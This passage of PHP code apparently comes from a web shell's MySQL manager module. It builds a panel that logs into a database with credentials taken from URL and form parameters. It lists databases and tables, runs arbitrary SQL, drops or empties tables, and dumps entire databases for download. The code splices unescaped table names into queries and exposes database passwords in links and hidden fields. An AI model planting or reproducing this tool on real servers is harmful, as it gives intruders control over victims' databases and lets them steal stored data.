    $sqlquicklaunch[] = array("Index",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&");
    $sqlquicklaunch[] = array("Query",$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl));
    $sqlquicklaunch[] = array("Server-status",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=serverstatus");
    $sqlquicklaunch[] = array("Server variables",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=servervars");
    $sqlquicklaunch[] = array("Processes",$surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&sql_act=processes");
    $sqlquicklaunch[] = array("Logout",$surl."act=sql");
    echo "MySQL ".mysql_get_server_info()." (proto v.".mysql_get_proto_info ().") running in ".htmlspecialchars($sql_server).":".htmlspecialchars($sql_port)." as ".htmlspecialchars($sql_login)."@".htmlspecialchars($sql_server)." (password - \"".htmlspecialchars($sql_passwd)."\")&lt;br&gt;";
    if (count($sqlquicklaunch) &gt; 0) {foreach($sqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt; ] ";}}
  }
  echo "&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;";
  if (!$sql_sock) {
    echo "&lt;td width=\"28%\" height=\"100\" valign=\"top\"&gt;&lt;li&gt;If login is null, login is owner of process.&lt;li&gt;If host is null, host is localhost&lt;/b&gt;&lt;li&gt;If port is null, port is 3306 (default)&lt;/td&gt;&lt;td width=\"90%\" height=1 valign=\"top\"&gt;";
    echo "&lt;table width=\"100%\" border=0&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Please, fill the form:&lt;/b&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Username&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Password&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Database&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;form action=\" $surl \" method=\"POST\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;tr&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_login\" value=\"root\" maxlength=\"64\"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"password\" name=\"sql_passwd\" value=\"\" maxlength=\"64\"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_db\" value=\"\" maxlength=\"64\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Host&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;PORT&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=right&gt;&lt;input type=\"text\" name=\"sql_server\" value=\"localhost\" maxlength=\"64\"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_port\" value=\"3306\" maxlength=\"6\" size=\"3\"&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"submit\" value=\"Connect\"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/td&gt;";
  }
  else {
    //Start left panel
    if (!empty($sql_db)) {
      ?&gt;&lt;td width="25%" height="100%" valign="top"&gt;&lt;a href="&lt;?php echo $surl."act=sql&sql_login=".htmlspecialchars($sql_login)."&sql_passwd=".htmlspecialchars($sql_passwd)."&sql_server=".htmlspecialchars($sql_server)."&sql_port=".htmlspecialchars($sql_port)."&"; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
      &lt;?php
      $result = mysql_list_tables($sql_db);
      if (!$result) {echo mysql_smarterror();}
      else {
        echo "---[ &lt;a href=\"".$sql_surl."&\"&gt;&lt;b&gt;".htmlspecialchars($sql_db)."&lt;/b&gt;&lt;/a&gt; ]---&lt;br&gt;";
        $c = 0;
        while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "&lt;b&gt;+&nbsp;&lt;a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"&gt;&lt;b&gt;".htmlspecialchars($row[0])."&lt;/b&gt;&lt;/a&gt; (".$count_row[0].")&lt;/br&gt;&lt;/b&gt;"; mysql_free_result($count); $c++;}
        if (!$c) {echo "No tables found in database.";}
      }
    }
    else {
      ?&gt;&lt;td width="1" height="100" valign="top"&gt;&lt;a href="&lt;?php echo $sql_surl; ?&gt;"&gt;&lt;b&gt;Home&lt;/b&gt;&lt;/a&gt;&lt;hr size="1" noshade&gt;
      &lt;?php
      $result = mysql_list_dbs($sql_sock);
      if (!$result) {echo mysql_smarterror();}
      else {
        ?&gt;&lt;form action="&lt;?php echo $surl; ?&gt;"&gt;&lt;input type="hidden" name="act" value="sql"&gt;&lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;&lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;&lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;select name="sql_db"&gt;
        &lt;?php
        $c = 0;
        $dbs = "";
        while ($row = mysql_fetch_row($result)) {$dbs .= "&lt;option value=\"".$row[0]."\""; if ($sql_db == $row[0]) {$dbs .= " selected";} $dbs .= "&gt;".$row[0]."&lt;/option&gt;"; $c++;}
        echo "&lt;option value=\"\"&gt;Databases (".$c.")&lt;/option&gt;";
        echo $dbs;
      }
      ?&gt;&lt;/select&gt;&lt;hr size="1" noshade&gt;Please, select database&lt;hr size="1" noshade&gt;&lt;input type="submit" value="Go"&gt;&lt;/form&gt;
      &lt;?php
    }
    //End left panel
    echo "&lt;/td&gt;&lt;td width=\"100%\"&gt;";
    //Start center panel
    $diplay = TRUE;
    if ($sql_db) {
      if (!is_numeric($c)) {$c = 0;}
      if ($c == 0) {$c = "no";}
      echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").&lt;br&gt;";
      if (count($dbquicklaunch) &gt; 0) {foreach($dbsqlquicklaunch as $item) {echo "[ &lt;a href=\"".$item[1]."\"&gt;".$item[0]."&lt;/a&gt; ] ";}}
      echo "&lt;/b&gt;&lt;/center&gt;";
      $acts = array("","dump");
      if ($sql_act == "tbldrop") {$sql_query = "DROP TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblempty") {$sql_query = ""; foreach($boxtbl as $v) {$sql_query .= "DELETE FROM `".$v."` \n";} $sql_act = "query";}
      elseif ($sql_act == "tbldump") {if (count($boxtbl) &gt; 0) {$dmptbls = $boxtbl;} elseif($thistbl) {$dmptbls = array($sql_tbl);} $sql_act = "dump";}
      elseif ($sql_act == "tblcheck") {$sql_query = "CHECK TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tbloptimize") {$sql_query = "OPTIMIZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblrepair") {$sql_query = "REPAIR TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "tblanalyze") {$sql_query = "ANALYZE TABLE"; foreach($boxtbl as $v) {$sql_query .= "\n`".$v."` ,";} $sql_query = substr($sql_query,0,-1).";"; $sql_act = "query";}
      elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}
      elseif ($sql_tbl_act == "insert") {
        if ($sql_tbl_insert_radio == 1) {
          $keys = "";
          $akeys = array_keys($sql_tbl_insert);
          foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}
          if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}
          $values = "";
          $i = 0;
          foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}
          if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}
          $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
        elseif ($sql_tbl_insert_radio == 2) {
          $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);
          $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";
          $result = mysql_query($sql_query) or print(mysql_smarterror());
          $result = mysql_fetch_array($result, MYSQL_ASSOC);
          $sql_act = "query";
          $sql_tbl_act = "browse";
        }
      }
      if ($sql_act == "query") {
        echo "&lt;hr size=\"1\" noshade&gt;";
        if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "&lt;b&gt;Error:&lt;/b&gt; &lt;br&gt;".$sql_query_error."&lt;br&gt;";}
        if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
        if ((!$submit) or ($sql_act)) {echo "&lt;table border=\"0\" width=\"100%\" height=\"1\"&gt;&lt;tr&gt;&lt;td&gt;&lt;form action=\"".$sql_surl."\" method=\"POST\"&gt;&lt;b&gt;"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "&lt;/b&gt;&lt;br&gt;&lt;br&gt;&lt;textarea name=\"sql_query\" cols=\"100\" rows=\"10\"&gt;".htmlspecialchars($sql_query)."&lt;/textarea&gt;&lt;br&gt;&lt;br&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"query\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"submit\" value=\"1\"&gt;&lt;input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"&gt;&lt;input type=\"submit\" name=\"sql_confirm\" value=\"Yes\"&gt; &lt;input type=\"submit\" value=\"No\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";}
      }
      if (in_array($sql_act,$acts)) {
        ?&gt;&lt;table border="0" width="100%" height="1"&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;b&gt;Create new table:&lt;/b&gt;
        &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
        &lt;input type="hidden" name="act" value="sql"&gt;
        &lt;input type="hidden" name="sql_act" value="newtbl"&gt;
        &lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;
        &lt;input type="text" name="sql_newtbl" size="20"&gt;
        &lt;input type="submit" value="Create"&gt;
        &lt;/form&gt;&lt;/td&gt;
        &lt;td width="30%" height="1"&gt;&lt;b&gt;Dump DB:&lt;/b&gt;
        &lt;form action="&lt;?php echo $surl; ?&gt;"&gt;
        &lt;input type="hidden" name="act" value="sql"&gt;
        &lt;input type="hidden" name="sql_act" value="dump"&gt;
        &lt;input type="hidden" name="sql_db" value="&lt;?php echo htmlspecialchars($sql_db); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_login" value="&lt;?php echo htmlspecialchars($sql_login); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_passwd" value="&lt;?php echo htmlspecialchars($sql_passwd); ?&gt;"&gt;
        &lt;input type="hidden" name="sql_server" value="&lt;?php echo htmlspecialchars($sql_server); ?&gt;"&gt;&lt;input type="hidden" name="sql_port" value="&lt;?php echo htmlspecialchars($sql_port); ?&gt;"&gt;&lt;input type="text" name="dump_file" size="30" value="&lt;?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?&gt;"&gt;&lt;input type="submit" name=\"submit\" value="Dump"&gt;&lt;/form&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;td width="30%" height="1"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
        &lt;?php
        if (!empty($sql_act)) {echo "&lt;hr size=\"1\" noshade&gt;";}
        if ($sql_act == "newtbl") {
          echo "&lt;b&gt;";
          if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {
            echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!&lt;/b&gt;&lt;br&gt;";
          }
          else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".&lt;br&gt;Reason:&lt;/b&gt; ".mysql_smarterror();}
        }
        elseif ($sql_act == "dump") {
          if (empty($submit)) {
            $diplay = FALSE;
            echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_act\" value=\"dump\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;b&gt;SQL-Dump:&lt;/b&gt;&lt;br&gt;&lt;br&gt;";
            echo "&lt;b&gt;DB:&lt;/b&gt; &lt;input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"&gt;&lt;br&gt;&lt;br&gt;";
            $v = join (";",$dmptbls);
            echo "&lt;b&gt;Only tables (explode \";\")&nbsp;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt;:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"&gt;&lt;br&gt;&lt;br&gt;";
            if ($dump_file) {$tmp = $dump_file;}
            else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}
            echo "&lt;b&gt;File:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"&gt;&lt;br&gt;&lt;br&gt;";
            echo "&lt;b&gt;Download: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked&gt;&lt;br&gt;&lt;br&gt;";
            echo "&lt;b&gt;Save to file: &lt;/b&gt;&nbsp;&lt;input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked&gt;";
            echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" name=\"submit\" value=\"Dump\"&gt;&lt;br&gt;&lt;br&gt;&lt;b&gt;&lt;sup&gt;1&lt;/sup&gt;&lt;/b&gt; - all, if empty";
            echo "&lt;/form&gt;";
          }
          else {
            $diplay = TRUE;
            $set = array();
            $set["sock"] = $sql_sock;
            $set["db"] = $sql_db;
            $dump_out = "download";
            $set["print"] = 0;
            $set["nl2br"] = 0;
            $set[""] = 0;
            $set["file"] = $dump_file;
            $set["add_drop"] = TRUE;
            $set["onlytabs"] = array();
            if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}
            $ret = mysql_dump($set);
            if ($sql_dump_download) {
              @ob_clean();
              header("Content-type: application/octet-stream");
              header("Content-length: ".strlen($ret));
              header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");
              echo $ret;
              exit;
            }
            elseif ($sql_dump_savetofile) {
              $fp = fopen($sql_dump_file,"w");
              if (!$fp) {echo "&lt;b&gt;Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
              else {
                fwrite($fp,$ret);
                fclose($fp);
                echo "&lt;b&gt;Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")&lt;/b&gt;.";
              }
            }
            else {echo "&lt;b&gt;Dump: nothing to do!&lt;/b&gt;";}
          }
        }
        if ($diplay) {
    if (!empty($sql_tbl)) {
      if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}
      $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");
      $count_row = mysql_fetch_array($count);
      mysql_free_result($count);
      $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");
      $tbl_struct_fields = array();
      while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}
      if ($sql_ls &gt; $sql_le) {$sql_le = $sql_ls + $perpage;}
      if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}
      if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}
      if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}
      $perpage = $sql_tbl_le - $sql_tbl_ls;
      if (!is_numeric($perpage)) {$perpage = 10;}
      $numpages = $count_row[0]/$perpage;
      $e = explode(" ",$sql_order);
      if (count($e) == 2) {
        if ($e[0] == "d") {$asc_desc = "DESC";}
        else {$asc_desc = "ASC";}
        $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";
      }
      else {$v = "";}
      $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";
      $result = mysql_query($query) or print(mysql_smarterror());
      echo "&lt;hr size=\"1\" noshade&gt;&lt;center&gt;&lt;b&gt;Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)&lt;/b&gt;&lt;/center&gt;";
      echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\"&gt;[&lt;b&gt; Structure &lt;/b&gt;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
      echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\"&gt;[&lt;b&gt; Browse &lt;/b&gt;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
      echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\"&gt;[&lt;b&gt; Dump &lt;/b&gt;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
      echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\"&gt;[&nbsp;&lt;b&gt;Insert&lt;/b&gt;&nbsp;]&lt;/a&gt;&nbsp;&nbsp;&nbsp;";
      if ($sql_tbl_act == "structure") {echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Coming sooon!&lt;/b&gt;";}
      if ($sql_tbl_act == "insert") {
        if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
        if (!empty($sql_tbl_insert_radio)) {  } //Not Ready
        else {
          echo "&lt;br&gt;&lt;br&gt;&lt;b&gt;Inserting row into table:&lt;/b&gt;&lt;br&gt;";
          if (!empty($sql_tbl_insert_q)) {
            $sql_query = "SELECT * FROM `".$sql_tbl."`";
            $sql_query .= " WHERE".$sql_tbl_insert_q;
            $sql_query .= " LIMIT 1;";
            $result = mysql_query($sql_query,$sql_sock) or print("&lt;br&gt;&lt;br&gt;".mysql_smarterror());
            $values = mysql_fetch_assoc($result);
            mysql_free_result($result);
          }
          else {$values = array();}
          echo "&lt;form method=\"POST\"&gt;&lt;table width=\"1%\" border=1&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;Field&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Type&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Function&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;b&gt;Value&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;";
          foreach ($tbl_struct_fields as $field) {
            $name = $field["Field"];
            if (empty($sql_tbl_insert_q)) {$v = "";}
            echo "&lt;tr&gt;&lt;td&gt;&lt;b&gt;".htmlspecialchars($name)."&lt;/b&gt;&lt;/td&gt;&lt;td&gt;".$field["Type"]."&lt;/td&gt;&lt;td&gt;&lt;select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"&gt;&lt;option value=\"\"&gt;&lt;/option&gt;&lt;option&gt;PASSWORD&lt;/option&gt;&lt;option&gt;MD5&lt;/option&gt;&lt;option&gt;ENCRYPT&lt;/option&gt;&lt;option&gt;ASCII&lt;/option&gt;&lt;option&gt;CHAR&lt;/option&gt;&lt;option&gt;RAND&lt;/option&gt;&lt;option&gt;LAST_INSERT_ID&lt;/option&gt;&lt;option&gt;COUNT&lt;/option&gt;&lt;option&gt;AVG&lt;/option&gt;&lt;option&gt;SUM&lt;/option&gt;&lt;option value=\"\"&gt;--------&lt;/option&gt;&lt;option&gt;SOUNDEX&lt;/option&gt;&lt;option&gt;LCASE&lt;/option&gt;&lt;option&gt;UCASE&lt;/option&gt;&lt;option&gt;NOW&lt;/option&gt;&lt;option&gt;CURDATE&lt;/option&gt;&lt;option&gt;CURTIME&lt;/option&gt;&lt;option&gt;FROM_DAYS&lt;/option&gt;&lt;option&gt;FROM_UNIXTIME&lt;/option&gt;&lt;option&gt;PERIOD_ADD&lt;/option&gt;&lt;option&gt;PERIOD_DIFF&lt;/option&gt;&lt;option&gt;TO_DAYS&lt;/option&gt;&lt;option&gt;UNIX_TIMESTAMP&lt;/option&gt;&lt;option&gt;USER&lt;/option&gt;&lt;option&gt;WEEKDAY&lt;/option&gt;&lt;option&gt;CONCAT&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50&gt;&lt;/td&gt;&lt;/tr&gt;";
            $i++;
          }
          echo "&lt;/table&gt;&lt;br&gt;";
          echo "&lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "&gt;&lt;b&gt;Insert as new row&lt;/b&gt;";
          if (!empty($sql_tbl_insert_q)) {echo " or &lt;input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked&gt;&lt;b&gt;Save&lt;/b&gt;"; echo "&lt;input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\"&gt;";}
          echo "&lt;br&gt;&lt;br&gt;&lt;input type=\"submit\" value=\"Confirm\"&gt;&lt;/form&gt;";
        }
      }
      if ($sql_tbl_act == "browse") {
        $sql_tbl_ls = abs($sql_tbl_ls);
        $sql_tbl_le = abs($sql_tbl_le);
        echo "&lt;hr size=\"1\" noshade&gt;";
        echo "&lt;img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\"&gt;&nbsp;";
        $b = 0;
        for($i=0;$i&lt;$numpages;$i++) {
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"&gt;&lt;u&gt;";}
          echo $i;
          if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "&lt;/u&gt;&lt;/a&gt;";}
          if (($i/30 == round($i/30)) and ($i &gt; 0)) {echo "&lt;br&gt;";}
          else {echo "&nbsp;";}
        }
        if ($i == 0) {echo "empty";}
        echo "&lt;form method=\"GET\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"sql\"&gt;&lt;input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"&gt;&lt;input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"&gt;&lt;input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"&gt;&lt;input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"&gt;&lt;input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"&gt;&lt;input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"&gt;&lt;input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"&gt;&lt;b&gt;From:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\"&gt;&nbsp;&lt;b&gt;To:&lt;/b&gt;&nbsp;&lt;input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\"&gt;&nbsp;&lt;input type=\"submit\" value=\"View\"&gt;&lt;/form&gt;";
        echo "&lt;br&gt;&lt;form method=\"POST\"&gt;&lt;TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1&gt;";
        echo "&lt;tr&gt;";
        echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"&gt;&lt;/td&gt;";
        for ($i=0;$i&lt;mysql_num_fields($result);$i++) {
          $v = mysql_field_name($result,$i);
          if ($e[0] == "a") {$s = "d"; $m = "asc";}
          else {$s = "a"; $m = "desc";}
          echo "&lt;td&gt;";
          if (empty($e[0])) {$e[0] = "a";}
          if ($e[1] != $v) {echo "&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"&gt;&lt;b&gt;".$v."&lt;/b&gt;&lt;/a&gt;";}
          else {echo "&lt;b&gt;".$v."&lt;/b&gt;&lt;a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"&gt;&lt;img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"&gt;&lt;/a&gt;";}
          echo "&lt;/td&gt;";
        }
      echo "&lt;td&gt;&lt;font color=\"green\"&gt;&lt;b&gt;Action&lt;/b&gt;&lt;/font&gt;&lt;/td&gt;";
      echo "&lt;/tr&gt;";
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
       echo "&lt;tr&gt;";
       $w = "";
       $i = 0;
       foreach ($row as $k=&gt;$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}
       if (count($row) &gt; 0) {$w = substr($w,0,strlen($w)-3);}
       echo "&lt;td&gt;&lt;input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"&gt;&lt;/td&gt;";
       $i = 0;
       foreach ($row as $k=&gt;$v)
       {
        $v = htmlspecialchars($v);
        if ($v == "") {$v = "&lt;font color=\"green\"&gt;NULL&lt;/font&gt;";}
        echo "&lt;td&gt;".$v."&lt;/td&gt;";
        $i++;
       }
       echo "&lt;td&gt;";
       echo "&lt;a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"&gt;&lt;img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"&gt;&lt;/a&gt;&nbsp;";
